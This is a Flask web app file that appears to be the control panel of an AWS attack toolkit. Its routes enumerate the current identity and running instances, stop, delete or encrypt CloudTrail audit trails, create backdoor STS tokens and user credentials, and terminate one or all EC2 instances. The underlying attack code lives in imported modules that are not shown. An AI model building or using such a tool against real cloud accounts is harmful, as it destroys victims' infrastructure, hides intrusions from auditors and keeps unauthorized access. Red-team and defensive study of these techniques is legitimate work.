from flask import Flask, request, render_template, url_for, redirect
import inventory
import persist as persister
import disrupt as ct_disrupt
import madness

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/recon')
def recon():
    who = inventory.Who()
    instances = inventory.Instance().get_all_running()
    return render_template('recon.html', instances=instances, who=who)

@app.route('/disrupt')
def disrupt():
    trails = inventory.CloudTrail().get_trails()
    trail_status = inventory.CloudTrail()
    return render_template('disrupt.html', trails=trails, trail_status=trail_status)

@app.route('/disrupt/<trail_name>/stop')
def disrupt_stop_trail(trail_name):
    try:
        disruption = ct_disrupt.Distruptor()
        disruption.stop_trail(trail_name)
    except:
        pass
    return redirect(url_for('disrupt'))

@app.route('/disrupt/<trail_name>/delete')
def disrupt_delete_trail(trail_name):
    try:
        disruption = ct_disrupt.Distruptor()
        disruption.delete_trail(trail_name)
    except:
        pass
    return redirect(url_for('disrupt'))


@app.route('/disrupt/<trail_name>/encrypt')
def disrupt_encrypt_trail(trail_name):
    try:
        disruption = ct_disrupt.Distruptor()
        disruption.encrypt_trail(trail_name)
    except:
        pass
    return redirect(url_for('disrupt'))

@app.route('/persist')
def persist():
    persist_attack = persister.Persistence()
    sts_token = persist_attack.backdoor_sts()
    return render_template('persist.html', persist=persist_attack, sts_token=sts_token)

@app.route('/persist/<user>/generate')
def generate_credential(user):
    persist_attack = persister.Persistence()
    credential = persist_attack.backdoor_user(user)
    return render_template('credential.html', credential=credential)

@app.route('/burn/<instance_id>/<region>')
def burn(instance_id, region):
    king = madness.Actions(region, instance_id)
    try:
        king.burn_instance()
    except:
        pass
    return redirect(url_for('recon'))


@app.route('/stop/<instance_id>/<region>')
def stop(instance_id, region):
    king = madness.Actions(region, instance_id)
    try:
        king.stop_instance()
    except:
        pass

    return redirect(url_for('recon'))

@app.route('/burn/all')
def burn_all():
    instances = inventory.Instance().get_all_running()
    king = madness.fullMadness(instances)
    king.burn_them_all()
    return redirect(url_for('index'))

# We only need this for local development.
if __name__ == '__main__':
    app.run()
